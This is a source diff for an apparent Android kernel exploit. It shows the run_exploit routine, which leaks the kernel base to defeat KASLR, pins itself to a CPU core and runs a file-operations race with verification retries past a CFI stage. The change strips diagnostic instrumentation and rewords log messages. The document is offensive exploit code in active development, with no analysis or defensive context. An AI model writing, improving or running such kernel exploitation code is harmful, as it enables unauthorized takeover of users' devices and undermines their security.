@@ -1,5 +1,4 @@
 #include "common.h"
-#include "czg3_diag.h"
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 uint32_t f_wait;
@@ -28,11 +27,8 @@ static void durable_log_checkpoint(const char *stage) {
   SYSCHK(fflush(NULL));
   SYSCHK(fstat(STDOUT_FILENO, &st));
   if (!S_ISREG(st.st_mode)) {
-    const char *type = S_ISFIFO(st.st_mode) ? "fifo" :
-                       (S_ISSOCK(st.st_mode) ? "socket" : "non-regular");
-    pr_info("durable log checkpoint unavailable stage=%s stdout_type=%s "
-            "mode=%#o durability=stream-only exploit_state=unaffected\n",
-            stage, type, st.st_mode);
+    pr_warning("durable log checkpoint skipped stage=%s mode=%#o\n",
+               stage, st.st_mode);
     return;
   }
   SYSCHK(fsync(STDOUT_FILENO));
@@ -435,11 +431,6 @@ int run_exploit(int argc, char **argv) {
   disable_rseq_for_thread();
   set_limit();
   log_startup_context();
-#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
-  czg3_diag_start(BUILD_VARIANT_LABEL);
-  czg3_diag_event("PREPARATION", 0, CZG3_SUCCESS, 0,
-                  "p0=unknown,waiter=idle,owner=idle,consumer=idle");
-#endif
   init_ashmem_path();
 
   pin_to_core(CORE);
@@ -452,17 +443,9 @@ int run_exploit(int argc, char **argv) {
   }
 #endif
   if (!slide_leak_kernel_base()) {
-#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
-    czg3_diag_event("P0_DISCOVERY", 0, CZG3_P0_DISCOVERY_FAILED, 0,
-                    "p0=invalid");
-#endif
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
-#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
-  czg3_diag_event("P0_DISCOVERY", 0, CZG3_SUCCESS, 1,
-                  slide_p0_session_fresh ? "p0=new" : "p0=reused");
-#endif
   if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
@@ -566,11 +549,6 @@ int run_exploit(int argc, char **argv) {
   return 1;
 #else
   durable_log_checkpoint("fops-page-held");
-#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
-  czg3_diag_checkpoint("FOPS_RACE_ENTER", 1);
-  czg3_diag_event("FOPS_RACE_ENTER", 1, CZG3_SUCCESS, 0,
-                  "waiter=prepared,owner=prepared,consumer=prepared");
-#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
     APP_FOPS_REUSE_VERIFIED_PAGE
@@ -592,7 +570,6 @@ int run_exploit(int argc, char **argv) {
       }
     }
     int triggered = app_trigger_fops_slide_route();
-    if (triggered) app_publish_writer_possible_mutation();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
@@ -639,11 +616,10 @@ int run_exploit(int argc, char **argv) {
             "step=%d errno=%d\n",
             attempt, fops_fresh_page_attempts, triggered, verified,
             cfi_last_step, cfi_last_errno);
-    if (verified) app_publish_writer_verified_success();
     if (verified || cfi_dirty_seen) {
       break;
     }
-    pr_info("app fops unverified route miss; releasing reclaim state before fresh "
+    pr_info("app fops clean miss; releasing reclaim state before fresh "
             "page attempt=%d/%d\n",
             attempt, fops_fresh_page_attempts);
   }
@@ -651,13 +627,11 @@ int run_exploit(int argc, char **argv) {
   start_p0_ref_keeper();
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
-    if (triggered) app_publish_writer_possible_mutation();
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
 #endif
     int verified = triggered && try_cfi_stage();
-    if (verified) app_publish_writer_verified_success();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
             attempt, triggered, verified, cfi_last_step, cfi_last_errno);
